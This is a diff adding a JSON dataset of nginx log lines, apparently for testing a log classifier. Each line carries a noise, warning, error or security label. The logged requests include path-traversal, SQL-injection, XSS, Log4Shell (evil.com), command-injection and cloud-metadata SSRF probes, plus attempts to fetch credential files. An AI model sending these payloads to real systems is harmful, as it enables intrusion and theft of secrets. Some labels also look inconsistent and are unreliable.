@@ -1,0 +1,457 @@
+[
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Sourcing /docker-entrypoint.d/15-local-resolvers.envsh",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Configuration complete; ready for start up",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /proxy_fail HTTP/1.1\" 502 157 \"-\" \"Python-urllib/3.14\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /empty_dir/ HTTP/1.1\" 403 153 \"-\" \"Python-urllib/3.14\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"POST / HTTP/1.1\" 413 183 \"-\" \"Python-urllib/3.14\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"POST /index.html HTTP/1.1\" 405 157 \"-\" \"Python-urllib/3.14\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"INVALID_VERB / HTTP/1.1\" 405 157 \"-\" \"-\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"POST / HTTP/1.1\" 413 183 \"-\" \"-\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 400 157 \"-\" \"-\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /../../../../etc/shadow HTTP/1.1\" 400 157 \"-\" \"-\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /.env HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /.git/config HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /.git/HEAD HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /wp-config.php HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /phpmyadmin/index.php HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /api/v1/users?id=1%20OR%201=1 HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /search?q=<script>alert('xss')</script> HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /cgi-bin/test.cgi?cmd=id HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /proc/self/environ HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /admin/backup.sql HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /.aws/credentials HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /api/v1/auth?user=admin'-- HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /console/login.action HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /search?q=${jndi:ldap://evil.com/a} HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /.ssh/id_rsa HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /shell?cmd=cat%20/etc/passwd HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /actuator/env HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /missing-route-a HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /missing-route-b HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /assets/missing-style.css HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /api/v2/deprecated HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /favicon.ico HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /docs/old-guide HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /v1/api/removed-endpoint HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /legacy/dashboard.html HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /static/bundle-old.js HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /images/logo-missing.png HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET / HTTP/1.1\" 200 896 \"-\" \"HealthCheck/1.0\"",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /index.html HTTP/1.1\" 200 896 \"-\" \"HealthCheck/1.0\"",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /robots.txt HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /health HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /status HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /api/v1/ping HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /metrics HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /version HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 172.17.0.1, server: localhost, request: \"GET /proxy_fail HTTP/1.1\", upstream: \"http://127.0.0.1:19999/proxy_fail\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *3 directory index of \"/usr/share/nginx/html/empty_dir/\" is forbidden, client: 172.17.0.1, server: localhost, request: \"GET /empty_dir/ HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *4 client intended to send too large body: 500 bytes, client: 172.17.0.1, server: localhost, request: \"POST / HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *7 client intended to send too large body: 5000 bytes, client: 172.17.0.1, server: localhost, request: \"POST / HTTP/1.1\", host: \"localhost\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *10 open() \"/usr/share/nginx/html/.env\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /.env HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *11 open() \"/usr/share/nginx/html/.git/config\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /.git/config HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *12 open() \"/usr/share/nginx/html/.git/HEAD\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /.git/HEAD HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *13 open() \"/usr/share/nginx/html/wp-config.php\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /wp-config.php HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *14 open() \"/usr/share/nginx/html/phpmyadmin/index.php\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /phpmyadmin/index.php HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *15 open() \"/usr/share/nginx/html/api/v1/users\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /api/v1/users?id=1%20OR%201=1 HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *16 open() \"/usr/share/nginx/html/search\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /search?q=<script>alert('xss')</script> HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *17 open() \"/usr/share/nginx/html/cgi-bin/test.cgi\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /cgi-bin/test.cgi?cmd=id HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *18 open() \"/usr/share/nginx/html/proc/self/environ\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /proc/self/environ HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *19 open() \"/usr/share/nginx/html/admin/backup.sql\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /admin/backup.sql HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *20 open() \"/usr/share/nginx/html/.aws/credentials\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /.aws/credentials HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *21 open() \"/usr/share/nginx/html/api/v1/auth\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /api/v1/auth?user=admin'-- HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *22 open() \"/usr/share/nginx/html/console/login.action\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /console/login.action HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *23 open() \"/usr/share/nginx/html/search\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /search?q=${jndi:ldap://evil.com/a} HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *24 open() \"/usr/share/nginx/html/.ssh/id_rsa\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /.ssh/id_rsa HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *25 open() \"/usr/share/nginx/html/shell\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /shell?cmd=cat%20/etc/passwd HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *26 open() \"/usr/share/nginx/html/proxy\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *27 open() \"/usr/share/nginx/html/actuator/env\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /actuator/env HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *28 open() \"/usr/share/nginx/html/missing-route-a\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /missing-route-a HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *29 open() \"/usr/share/nginx/html/missing-route-b\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /missing-route-b HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *30 open() \"/usr/share/nginx/html/assets/missing-style.css\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /assets/missing-style.css HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *31 open() \"/usr/share/nginx/html/api/v2/deprecated\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /api/v2/deprecated HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *32 open() \"/usr/share/nginx/html/favicon.ico\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /favicon.ico HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *33 open() \"/usr/share/nginx/html/docs/old-guide\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /docs/old-guide HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *34 open() \"/usr/share/nginx/html/v1/api/removed-endpoint\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /v1/api/removed-endpoint HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *35 open() \"/usr/share/nginx/html/legacy/dashboard.html\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /legacy/dashboard.html HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *36 open() \"/usr/share/nginx/html/static/bundle-old.js\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /static/bundle-old.js HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *37 open() \"/usr/share/nginx/html/images/logo-missing.png\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /images/logo-missing.png HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *40 open() \"/usr/share/nginx/html/robots.txt\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /robots.txt HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *41 open() \"/usr/share/nginx/html/health\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /health HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *42 open() \"/usr/share/nginx/html/status\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /status HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *43 open() \"/usr/share/nginx/html/api/v1/ping\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /api/v1/ping HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *44 open() \"/usr/share/nginx/html/metrics\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /metrics HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *45 open() \"/usr/share/nginx/html/version\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /version HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  }
+]
